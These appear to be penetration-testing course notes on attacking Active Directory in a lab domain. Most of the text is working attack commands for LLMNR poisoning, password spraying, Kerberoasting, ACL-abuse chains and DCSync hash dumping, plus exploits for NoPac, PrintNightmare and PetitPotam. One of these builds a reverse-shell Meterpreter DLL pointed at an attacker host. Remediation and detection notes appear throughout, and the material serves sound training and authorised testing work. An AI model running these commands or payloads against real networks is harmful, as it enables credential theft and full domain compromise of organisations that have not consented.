# Active Directory Enumeration & Attacks

AD = Microsoft's directory service (x.500/LDAP roots) providing authentication, accounting, and authorization for Windows enterprises. \~43% of the enterprise IAM market; a huge attack surface of services + permissions that are chronically misconfigured.

Attack mindset: enumerate iteratively, understand the "why" behind each flaw, and be able to work from Linux, Windows, and "living off the land" — tools fail or are blocked on real engagements.

{% stepper %}
{% step %}
## Kerberoast weak service account

Kerberoast a weak service account → share write access → drop SCF files + Responder → catch a Domain Admin's NetNTLMv2 hash.
{% endstep %}

{% step %}
## SMB NULL session attack chain

SMB NULL session → full user list + password policy → careful spray (Spring@18 style) → BloodHound finds local-admin hosts → steal a DA's TGT from a live session (Rubeus) → pass-the-ticket.
{% endstep %}

{% step %}
## Kerbrute and ACL attack chain

Kerbrute userenum from LinkedIn-mashed lists → spray Welcome2021 → one hit → DomainPasswordSpray from inside → Help Desk account with GenericAll over Enterprise Key Admins → Shadow Credentials on a DC machine account → DCSync = the domain.
{% endstep %}
{% endstepper %}

## External Recon and Enumeration Principles

Validate scope, find leaked creds, build username lists before touching the internal network.

Hunt for:

* **IP space** — ASN/netblocks via IANA, arin, RIPE, Hurricane Electric BGP Toolkit (bgp.he.net). Big orgs have their own ASN; small ones squat on cloud provider space — know where infrastructure lives so you don't test out-of-scope third parties (some providers require written approval; AWS has testing guidelines; Oracle wants a notification).
* **Domain info** — DNS records, subdomains, mail/DNS/VPN portals, defenses (SIEM/AV/IPS). domaintools, viewdns.info, manual `nslookup` against the domain's nameservers.
* **Schema format** — email/username formats for spraying. Job postings (SharePoint 2013+2016 in a listing = in-place upgrades, version drift), LinkedIn, "About Us"/"Contact Us" pages. Google dorks: `filetype:pdf inurl:inlanefreight.com` for documents, `intext:"@inlanefreight.com" inurl:inlanefreight.com` for emails (metadata in PDFs leaks the internal username format — even GUID-style formats like F9L8).
* **Data disclosures** — GitHub/AWS/Azure blobs, google dorks. Trufflehog, Greyhat Warfare.
* **Breach data** — HaveIBeenPwned for breach exposure; Dehashed for cleartext passwords/hashes to try against VPN/OWA/O365/RDS/Citrix portals using AD auth.

Enumeration is iterative: passive first (wide → narrow), analyze, then active. Save every file, screenshot, and tool output as you go.

## Initial Enumeration of the Domain

Lab position: Linux attack host inside 172.16.5.0/23, no credentials, grey box, non-evasive.

Internal test setups vary: VM calling back over VPN, physical drop box, on-site laptop, cloud VM, VPN access — which blocks LLMNR poisoning, managed workstation/VDI.

Looking for:

* Users to spray
* Key computers: DCs, file/SQL/web/mail servers
* Key services: Kerberos, NetBIOS, LDAP, DNS
* Quick-win vulnerable hosts

### Passive first — put an ear on the wire

```bash
sudo wireshark                 # or tcpdump -i ens224; ARP + MDNS reveal hosts on the segment
sudo responder -I ens224 -A    # analyze mode: listens for LLMNR/NBT-NS/MDNS, sends nothing
```

### Active host discovery

```bash
fping -asgq 172.16.5.0/23      # ICMP sweep, alive hosts only, stats at end
sudo nmap -v -A -iL hosts.txt -oN host-enum    # feed discovered hosts; -oA to keep formats
```

Nmap flags the DC by its service set:

`53/88/135/139/389/445/464/593/636/3268/3269/3389`

Old hosts (IIS 7.5, Server 2008 R2, MSSQL 2008) = legacy OS still alive — potential MS08-067/EternalBlue territory.

{% hint style="warning" %}
Get client approval in writing before touching fragile legacy systems; they may prefer observe-and-report.
{% endhint %}

### Kerbrute — username enumeration without credentials

```bash
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```

Uses Kerberos pre-auth; no 4625 logon-failure events (only 4768 TGT-request events, and only if Kerberos logging is enabled). \~48k names from the statistically-likely-usernames repo checked in \~10 seconds.

{% hint style="warning" %}
Failed pre-auth counts as failed login and WILL lock accounts.
{% endhint %}

SYSTEM on a domain-joined host ≈ domain user. The computer account can enumerate AD, Kerberoast, run Inveigh, token-impersonate.

Ways in:

* Remote exploits: MS08-067, EternalBlue, BlueKeep
* SeImpersonate abuse: JuicyPotato — not always on Server 2019
* Local privesc flaws
* Local admin + PsExec

## LLMNR/NBT-NS Poisoning - from Linux

LLMNR (UDP 5355) and NBT-NS (UDP 137) answer name-resolution when DNS fails — and **any** host can answer.

Victim typo: `\\printer01` → DNS says no → broadcast → Responder claims to be printer01 → victim sends NTLMv2 hash → crack offline or relay.

Relay needs SMB signing disabled.

```bash
sudo responder -I ens224        # default poisoning mode
# useful flags: -A analyze, -f fingerprint, -w WPAD rogue proxy, -F/-P force auth (can cause login prompts)
```

Hashes land in `/usr/share/responder/logs/` as `SMB-NTLMv2-SSP-<ip>.txt` and in a SQLite DB.

Responder needs root and a pile of free ports:

`137/138/53 UDP, 389, 445, 135, 139, 80, 21, 25, 110, 587, 3128, 5355/5353...`

Run it in tmux alongside other work and collect.

```bash
hashcat -m 5600 forend_ntlmv2 rockyou.txt
```

NetNTLMv2 cannot be pass-the-hashed — crack or relay only. The same account produces different-looking hashes every time because of random challenges; they are all the same password.

## LLMNR/NBT-NS Poisoning - from Windows

**Inveigh** (PowerShell legacy version + maintained C# InveighZero) does the same job from Windows.

Covers LLMNR, DNS, mDNS, NBNS, DHCPv6, ICMPv6, HTTP(S), SMB, LDAP, WebDAV, and proxy auth.

```powershell
Import-Module .\Inveigh.ps1
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

C# version: run `Inveigh.exe`, hit ESC for the interactive console:

* `GET NTLMV2UNIQUE`
* `GET NTLMV2USERNAMES`
* `GET CLEARTEXT`
* `STOP`

`[+]` = enabled, `[ ]` = disabled.

### Remediation

Disable LLMNR via GPO:

`Computer Config > Admin Templates > Network > DNS Client > "Turn off multicast name resolution"`

NBT-NS has no GPO — use the per-host adapter WINS setting, or push a startup script setting `NetbiosOptions=2` under:

`HKLM\SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces`

from SYSVOL.

Also:

* Enable SMB signing
* Filter 5355/137
* Alert on NBT-NS responses for nonexistent hosts

## Password Spraying Overview

One password, many usernames, delays between rounds.

Lockout math governs everything: typical policy = 5 bad attempts / 30-min lockout / auto-unlock. Unknown policy → one attempt max, or wait hours between.

Always log:

* Accounts targeted
* DC used
* Time/date
* Passwords tried

Name-format creativity: GUID usernames (F9L8) leaked via PDF metadata → generate all combos with a bash brace loop → Kerbrute enumerates 100% of accounts.

## Enumerating & Retrieving Password Policies

### Credentialed

```bash
crackmapexec smb 172.16.5.5 -u avazquez -p <PASSWORD> --pass-pol
```

### Unauthenticated SMB NULL session

Often left over from in-place DC upgrades.

```bash
rpcclient -U "" -N 172.16.5.5      # then: querydominfo, getdompwinfo, enumdomusers
enum4linux -P 172.16.5.5           # password policy dump
enum4linux-ng -P 172.16.5.5 -oA ilfreight   # same + JSON/YAML output
```

### LDAP anonymous bind

```bash
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

### Windows

```cmd
net accounts                     :: policy in one shot; also net use \\DC01\ipc$ "" /u:"" tests NULL session
                                 :: error 1331 = disabled acct, 1326 = bad password, 1909 = locked out
```

```powershell
Import-Module .\PowerView.ps1
Get-DomainPolicy                  :: adds PasswordComplexity flag visibility
```

Default domain policy, which is never changed in plenty of organizations:

* Minimum length: 7
* Complexity: enabled
* Password history: 24
* Lockout threshold: 0

## Password Spraying - Making a Target User List

Sources:

* SMB NULL session
* LDAP anonymous bind
* Kerbrute + wordlist
* Existing credentials

```bash
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
rpcclient -U "" -N 172.16.5.5 -c enumdomusers
crackmapexec smb 172.16.5.5 --users      # NULL session; shows badpwdcount + baddpwdtime per user
                                         # filter out accounts near lockout; multi-DC = sum the counters
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U       # anonymous LDAP; also --da, -PU (nested privileged users)
```

## Internal Password Spraying - from Linux

```bash
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p 'Password123' | grep +
```

### Local admin password reuse

Spray the NT hash across the subnet, one shot per host:

```bash
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

`--local-auth` prevents domain lockouts.

{% hint style="warning" %}
This is noisy; report it regardless. Fix = LAPS.
{% endhint %}

Also try:

* Password patterns across account types: `$desktop%@admin123` → `$server%@admin123`
* User vs. their `_adm` account
* Cross-domain same-name users

## Internal Password Spraying - from Windows

DomainPasswordSpray auto-generates the user list from AD, reads the lockout threshold, and strips accounts within one attempt of lockout:

```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success
```

Detection:

* 4625 floods: SMB
* 4771 Kerberos pre-auth failures: LDAP-based spraying; needs Kerberos logging enabled

Mitigations:

* MFA on all external portals
* Least-privilege access
* Separate admin accounts
* Passphrase education
* Password filters blocking months, seasons, and company name

## Enumerating Security Controls

Post-foothold checks that shape tool choice:

```powershell
Get-MpComputerStatus              # Defender: RealTimeProtectionEnabled, behavior monitor, tamper protection
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
$ExecutionContext.SessionState.LanguageMode    # ConstrainedLanguage = locked-down PowerShell
```

AppLocker often blocks only `%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe` — the SysWOW64 copy or PowerShell\_ISE still runs.

### LAPS enumeration

LAPSToolkit:

```powershell
Find-LAPSDelegatedGroups          # who can read LAPS passwords per OU
Find-AdmPwdExtendedRights         # accounts with All Extended Rights (can read passwords)
Get-LAPSComputers                 # expiry dates, and cleartext passwords if readable
```

## Credentialed Enumeration - from Linux

CrackMapExec (smb/winrm/mssql/ssh) — every flag is a mini-tool:

```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p <PASSWORD> --users          # + badpwdcount per user
sudo crackmapexec smb 172.16.5.5 -u forend -p <PASSWORD> --groups
sudo crackmapexec smb 172.16.5.130 -u forend -p <PASSWORD> --loggedon-users   # (Pwn3d!) = local admin
sudo crackmapexec smb 172.16.5.5 -u forend -p <PASSWORD> --shares
sudo crackmapexec smb 172.16.5.5 -u forend -p <PASSWORD> -M spider_plus --share 'Department Shares'
# spider_plus writes a JSON file inventory of every readable file to /tmp/cme_spider_plus/<ip>.json
```

### SMBMap

```bash
smbmap -u forend -p <PASSWORD> -d INLANEFREIGHT.LOCAL -H 172.16.5.5
smbmap -u forend -p <PASSWORD> -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```

### rpcclient

RID mechanics: domain SID + RID = object SID. Built-in Administrator is always RID 500 (`0x1f4`).

```bash
rpcclient -U "" -N 172.16.5.5
> queryuser 0x457
> enumdomusers
```

### Impacket remote shells

```bash
psexec.py inlanefreight.local/wley:'<PASSWORD>'@172.16.5.125    # uploads service binary to ADMIN$, SYSTEM shell
wmiexec.py inlanefreight.local/wley:'<PASSWORD>'@172.16.5.5     # WMI, no file drops, runs as the connecting user; each command = new cmd.exe (4688 events)
```

### windapsearch

```bash
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p <PASSWORD> --da    # Domain Admins
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p <PASSWORD> -PU    # nested privileged users
```

### BloodHound.py ingestor

Needs Impacket, ldap3, dnspython; works from a non-domain-joined host with just credentials.

```bash
sudo bloodhound-python -u forend -p <PASSWORD> -ns 172.16.5.5 -d inlanefreight.local -c all
# → <date>_computers/domains/groups/users.json → zip and upload to the BloodHound GUI (neo4j start; bloodhound)
```

GUI:

* Analysis tab pre-built queries: start with Find Shortest Paths to Domain Admins
* Node Info
* Custom Cypher in the Raw Query box

## Credentialed Enumeration - from Windows

### ActiveDirectory PowerShell module

Stealthiest — blends into admin traffic.

```powershell
Import-Module ActiveDirectory
Get-ADDomain                                          # SID, functional level, child domains, FSMO holders
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName   # Kerberoast targets
Get-ADTrust -Filter *                                 # direction, IntraForest vs ForestTransitive
Get-ADGroup -Identity "Backup Operators"
Get-ADGroupMember -Identity "Backup Operators"
```

### PowerView core functions

```powershell
Import-Module .\PowerView.ps1
Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select name,samaccountname,memberof,pwdlastset,admincount,serviceprincipalname,useraccountcontrol
Get-DomainGroupMember -Identity "Domain Admins" -Recurse      # nested membership expanded
Get-DomainTrustMapping
Test-AdminAccess -ComputerName ACADEMY-EA-MS01                # IsAdmin True/False
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
Find-InterestingDomainAcl                                      # ACLs with modification rights on non-built-ins
Get-DomainFileServer / Get-DomainDFSShare
```

SharpView = .NET port, same verbs — useful where PowerShell is blocked.

### Snaffler

Share pillaging from a domain context:

```powershell
.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data -o snaffler.log
# color-coded: Red = .key/.kdbx/.ppk/credentials-ish, Black = password DBs; Green shares
```

### SharpHound

From a domain-joined host:

```powershell
.\SharpHound.exe -c All --zipfilename ILFREIGHT
```

Upload the zip in the GUI.

Useful queries:

* Find Computers with Unsupported Operating Systems
* Find Computers where Domain Users are Local Admin

{% hint style="warning" %}
Verify that unsupported systems are live before reporting — stale AD records exist.
{% endhint %}

First BloodHound check after any foothold: does Domain Users have local admin or execution rights anywhere?

## Living Off the Land

When tools cannot be loaded, such as on a managed host, VDI, or no-internet environment:

```cmd
hostname & systeminfo                       :: one command, fewer logs than the stack of wmic/set/ipconfig
wmic qfe get Caption,Description,HotFixID,InstalledOn
wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress   # domain + trusts
wmic useraccount list /format:list
net accounts /domain
net group "Domain Admins" /domain
net user /domain
net view /domain
net1 group "Domain Admins" /domain         :: net1 dodges alerts keyed on the "net" string
qwinsta                                     :: who else is logged on
arp -a & route print                        # known hosts + reachable networks (pivot candidates)
```

### dsquery

DLL ships on all modern Windows; needs elevated shell.

```cmd
dsquery user
dsquery computer
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl   :: PASSWD_NOTREQD accounts
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -attr sAMAccountName    :: Domain Controllers
```

LDAP OID matching rules:

* `1.2.840.113556.1.4.803` = bit must match exactly
* `...804` = any bit matches
* `...1941` = recursive/DN matching

Combine with `&`, `|`, and `!` operators.

### PowerShell opsec

`powershell.exe -version 2` downgrades to a version where script-block logging does not exist. The downgrade command itself is logged — 400/4104 events stop after.

```powershell
Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
```

The user’s command history can contain passwords.

Checks:

```powershell
netsh advfirewall show allprofiles
sc query windefend
Get-MpComputerStatus
```

## Kerberoasting - from Linux

Any domain user can request a TGS for any SPN account; the TGS-REP is encrypted with the service account's NT hash → offline crack.

Service accounts are frequently privileged: local admin on many hosts, Domain Admins via nesting. Even a low-privilege hit is useful: crack sqldev → craft service tickets for MSSQLSvc → sysadmin on the SQL box → xp\_cmdshell.

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend                 # list SPN accounts + group membership
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request        # all tickets, hashcat-ready
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
hashcat -m 13100 sqldev_tgs rockyou.txt
# hashes: $krb5tgs$23$ = RC4 (fast to crack); $krb5tgs$18$ = AES256 → mode 19700, far slower
```

## Kerberoasting - from Windows

### Semi-manual

setspn + .NET + Mimikatz:

```powershell
setspn.exe -Q */*          # enumerate SPNs (focus on user accounts, ignore computers)
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"   # requests TGS into memory
```

```cmd
mimikatz # base64 /out:true
mimikatz # kerberos::list /export       :: .kirbi files or base64 blobs
```

### Cracking pipeline for kirbis

```bash
cat encoded_file | tr -d \\n | base64 -d > sqldev.kirbi
python2.7 kirbi2john.py sqldev.kirbi
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
hashcat -m 13100 sqldev_tgs_hashcat rockyou.txt
```

### PowerView

```powershell
Get-DomainUser * -spn | select samaccountname
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

### Rubeus

```powershell
.\Rubeus.exe kerberoast /stats                        # counts by encryption type + pwd-last-set year
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap     # privileged accounts only, no line-wrapping
.\Rubeus.exe kerberoast /user:testspn /nowrap
```

### Encryption types

Tools request RC4 (etype 23) because it cracks fast.

* `msds-supportedencryptiontypes`: `0` = default RC4, `24` = AES-only
* AES-256 ticket on a CPU: \~23 min for full rockyou vs. 4s for RC4
* `/tgtdeleg` forces RC4 even for AES-enabled accounts on Server 2016 and earlier DCs because of a backward-compatibility failsafe
* Server 2019 DCs always return the highest etype
* GPO `Network security: Configure encryption types allowed for Kerberos` controls this — removing RC4 requires testing

Detection: event 4769 (Kerberos service ticket requested) floods with encryption `0x17`; enable `Audit Kerberos Service Ticket Operations`.

Fix:

* gMSA/MSA accounts
* Strong, long service passwords
* No privileged accounts as SPNs

## Access Control List (ACL) Abuse Primer

* **DACL** = who can access an object. Empty DACL = deny all; no DACL = allow all.
* **SACL** = audit logging.
* **ACE** = one entry in the DACL: SID + type (allow/deny/audit) + inheritance flags + access mask. Evaluated top-to-bottom until a deny matches.

| Abusable right                                      | PowerView verb                                                          |
| --------------------------------------------------- | ----------------------------------------------------------------------- |
| `ForceChangePassword`                               | `Set-DomainUserPassword`                                                |
| `Add Members` / `AddSelf` / `GenericAll` over group | `Add-DomainGroupMember`                                                 |
| `GenericWrite`                                      | `Set-DomainObject` — set an SPN for targeted Kerberoast, or add members |
| `WriteOwner`                                        | `Set-DomainObjectOwner`                                                 |
| `WriteDACL`                                         | `Add-DomainObjectACL`                                                   |
| `AllExtendedRights`                                 | Password reset / group add                                              |
| `GenericAll` over a computer + LAPS                 | Read the LAPS password                                                  |

These never show up in vuln scans and fester for years.

Common shapes:

* Help-desk password-reset rights
* Group-membership management rights
* Excessive rights from software installs, such as Exchange

{% hint style="warning" %}
Password resets are destructive — clear them with the client first, document everything, and revert changes.
{% endhint %}

## ACL Enumeration

Targeted enumeration beats dumping everything. Walk the chain from a user you control:

```powershell
$sid = Convert-NameToSid wley
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
# -ResolveGUIDs turns ObjectAceType GUIDs into names (e.g. User-Force-Change-Password)
```

### GUID lookup without PowerView

Fresh session required:

```powershell
$guid = "00299570-246d-11d0-a768-00aa006e0529"
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * | Select Name,DisplayName,rightsGuid | ? {$_.rightsGuid -eq $guid}
```

### Built-in-only alternative

Slow but tool-free:

```powershell
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
foreach($line in [System.IO.File]::ReadLines("ad_users.txt")) { get-acl "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
```

### Worked chain

wley → ForceChangePassword over damundsen → damundsen has GenericWrite on "Help Desk Level 1" group → that group nests into Information Technology → IT has GenericAll over adunn → adunn holds DS-Replication-Get-Changes + ...-In-Filtered-Set = DCSync rights.

BloodHound shows the same chain:

* Node Info → Outbound Control Rights → First Degree / Transitive Object Control
* Right-click any edge → Help for abuse info, opsec, and references

## ACL Abuse Tactics

Executing the chain:

```powershell
# 1. wley resets damundsen's password
$SecPassword = ConvertTo-SecureString '<WLEY_PASSWORD>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose

# 2. damundsen (GenericWrite) joins the group
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName

# 3. via nested IT membership: GenericAll over adunn → targeted Kerberoasting (safer than resetting an admin's password)
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
.\Rubeus.exe kerberoast /user:adunn /nowrap
# crack with hashcat -m 13100
```

### Cleanup

Perform cleanup in the right order. Lose group rights first, and you cannot remove the SPN.

```powershell
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
# restore damundsen's original password or have the client reset it
```

From Linux: `pth-net` (pth-toolkit) and `targetedKerberoast` create a temporary SPN, roast it, and delete it in one shot.

Detection: event 5136 (directory service object modified). SDDL in details is unreadable:

```powershell
ConvertFrom-SddlString "<sddl>"
```

Filter on `DiscretionaryAcl`.

## DCSync

Mimic a DC via the Directory Replication Service (DRSUAPI) to pull password hashes.

Requires an account with:

* Replicating Directory Changes
* Replicating Directory Changes All

Domain/Enterprise Admins have it, as do misconfigured standard users.

```powershell
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid}
```

### From Linux

```bash
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
# variants: -just-dc-ntlm (hashes only), -just-dc-user <USER>, -pwd-last-set, -history, -user-status (skip disabled accounts in cracking stats)
```

Output files:

* `.ntds` — hashes
* `.ntds.kerberos` — keys
* `.ntds.cleartext` — cleartext appears for accounts with reversible encryption set

Reversible encryption check:

```powershell
Get-ADUser -Filter 'userAccountControl -band 128'
```

Passwords are stored RC4-encrypted with SYSKEY and automatically decrypted by secretsdump.

### From Windows

Must run in the DCSync-privileged user’s context:

```cmd
runas /netonly /user:INLANEFREIGHT\adunn powershell
```

```cmd
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```

## Privileged Access

No local admin anywhere? Check execution rights such as BloodHound edges `CanRDP`, `CanPSRemote`, and `SQLAdmin`.

```powershell
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"      # Domain Users = everyone can RDP
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"   # WinRM without local admin
```

Custom Cypher for WinRM rights:

```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

```powershell
$password = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("INLANEFREIGHT\forend", $password)
Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
```

```bash
evil-winrm -i <TARGET_IP> -u forend          # or -H <NTHASH>; -r <REALM> for Kerberos
```

### SQL admin

SQLAdmin edge; credentials often come from Kerberoasting or a Snaffler-found web.config.

```powershell
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain                                            # find instances
Get-SQLQuery -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "<PASSWORD>" -query 'Select @@version'
```

```bash
mssqlclient.py INLANEFREIGHT/damundsen@172.16.5.150 -windows-auth
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami /priv       # SQL service accounts almost always hold SeImpersonatePrivilege
```

Any MSSQL credential found anywhere gets tested against every SQL server in scope — it is near-guaranteed host SYSTEM via potato-style privesc.

## Kerberos "Double Hop" Problem

WinRM authenticates with a TGS for that one host; the user’s TGT/credentials never land in memory, so the second hop — host → DC for PowerView and similar tools — fails.

`klist` shows only a ticket to the local service; Mimikatz shows blanks where credentials should be.

{% stepper %}
{% step %}
## Use a PSCredential object

Re-send credentials with each command:

```powershell
$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)
get-domainuser -spn -credential $Cred      # works; without -credential it fails
```

RDP into the host instead of WinRM and the password is cached — no double hop at all.
{% endstep %}

{% step %}
## Register a PSSession configuration

Windows/GUI + elevated PowerShell only. Does not work from evil-winrm or Linux PowerShell.

```powershell
Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm
Restart-Service WinRM     # kicks the session
Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName backupadmsess
klist                     # krbtgt ticket now cached; PowerView works without -Credential
```
{% endstep %}
{% endstepper %}

Also possible:

* Nested `Invoke-Command`
* CredSSP
* Port forwarding
* Process injection into a sacrificial process

## Bleeding Edge Vulnerabilities

### NoPac / SamAccountName Spoofing

**CVE-2021-42278 + 42287** — standard user → Domain Admin in one command.

Add a machine account; default quota `ms-DS-MachineAccountQuota = 10`. Rename its `sAMAccountName` to a DC's name, request tickets, and the KDC issues under the DC's name.

```bash
sudo python3 scanner.py inlanefreight.local/forend:<PASSWORD> -dc-ip 172.16.5.5 -use-ldap
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:<PASSWORD> -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:<PASSWORD> -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```

ccache files land in the working directory — clean them up.

{% hint style="warning" %}
smbexec-based shells get flagged by Defender as `VirTool:Win32/MSPSEexecCommand`.
{% endhint %}

### PrintNightmare

**CVE-2021-34527 / 1675** — Print Spooler RCE, remote from a standard domain user.

```bash
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'      # confirm exposed protocols
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=8080 -f dll > backupscript.dll
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:<PASSWORD>@172.16.5.5 '\\<ATTACKER_IP>\CompData\backupscript.dll'
```

DC pulls and executes the DLL → SYSTEM Meterpreter.

{% hint style="warning" %}
This can crash the spooler — warn the client.
{% endhint %}

### PetitPotam

**CVE-2021-36942** — unauthenticated coerce-auth via MS-EFSRPC (LSARPC, SMB 445) → relay DC auth to AD CS web enrollment → DC cert → TGT → DCSync.

```bash
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
python3 PetitPotam.py <ATTACKER_IP> 172.16.5.5        # EfsRpcOpenFileRaw coerce; "Got expected ERROR_BAD_NETPATH" = success
```

Then with the base64 cert:

```bash
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/'ACADEMY-EA-DC01$' -pfx-base64 <B64CERT> dc01.ccache
export KRB5CCNAME=dc01.ccache
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
# alternative: getnthash.py -key <AS-REP-key> INLANEFREIGHT.LOCAL/'ACADEMY-EA-DC01$'  → NT hash → -hashes dump
```

Windows route with the same cert:

```powershell
.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:<B64CERT> /ptt
mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt
```

Mitigations beyond the patch:

* EPA + Require SSL on CA web enrollment
* Disable NTLM on DCs, AD CS, and IIS

PetitPotam trigger also lives in Mimikatz:

```
misc::efs /server:<DC> /connect:<ATTACKER>
```

and `Invoke-PetitPotam.ps1`.

## Miscellaneous Misconfigurations

* **Exchange groups** — Exchange Windows Permissions members can write a DACL on the domain object → grant DCSync. Organization Management = Exchange's Domain Admins: reads all mailboxes and controls the Exchange Security Groups OU. Compromising an Exchange server = DA + memory full of OWA credentials.
* **PrivExchange** — any mailbox user can push the Exchange server (SYSTEM) into authenticating to an attacker host; relay to LDAP → NTDS dump. Pre-2019 CU.
